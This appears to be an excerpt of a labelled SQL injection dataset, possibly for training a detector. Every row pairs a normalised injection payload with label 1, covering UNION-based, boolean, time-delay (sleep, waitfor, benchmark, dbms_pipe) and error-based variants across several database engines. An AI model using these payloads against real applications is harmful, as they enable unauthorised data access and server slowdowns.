row_index,payload_norm,label,sqli_type_hint
3030,select case when 8975 = 2352 then 1 else null end--,1,
3031,"1%"" ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
3032,"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null#",1,
3033,"1 ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 6583 = 6583",1,
3034,"1' ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
3035,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'hmqq' = 'hmqq",1,
3036,waitfor delay '0:0:5' and ( ( 7619 = 7619,1,
3037,1' ) where 4729 = 4729,1,
3038,"1"" where 9973 = 9973 and 2006 = 2006",1,
3039,"-3954' ) ) union all select 2417,2417--",1,
3040,"1' ) ) union all select null,null,null,null--",1,
3041,1'+ ( select 'njee' where 4101 = 4101 and 3090 = 7873 ) +',1,
3042,"1"" ) ) as tybm where 2687 = 2687 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
3043,"-6593"" ) union all select 6216,6216,6216,6216,6216,6216,6216#",1,
3044,"1"" ) and make_set ( 4539 = 6401,6401 ) and ( ""kglx"" = ""kglx",1,
3045,1' ) and 7290 = 8416 and ( 'ktlz' like 'ktlz,1,
3046,"-8472' ) where 3340 = 3340 or make_set ( 1752 = 9905,9905 ) --",1,
3047,"1"" ) where 9770 = 9770 union all select null,null,null,null,null,null--",1,
3048,"1'+ ( select ocvc where 6981 = 6981 union all select null,null,null,null,null,null,null,null,null,null#",1,
3049,"1 ) ) union all select null,null,null,null,null,null,null--",1,
3050,"-6214"" union all select 3323,3323#",1,
3051,-7979'+ ( select 'bkvt' where 3613 = 3613 union all select 3613#,1,
3052,"1'|| ( select 'ymwf' where 1229 = 1229 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) ||'",1,
3053,select sleep ( 5 ) and ( ( 3404 = 3404,1,
3054,1'|| ( select 'fjlg' from dual where 9517 = 9517,1,
3055,"1 ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
3056,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",1,
3057,"1%"" ) union all select null--",1,
3058,"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'jiyx' = 'jiyx",1,
3059,"1%"" ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""%"" = """,1,
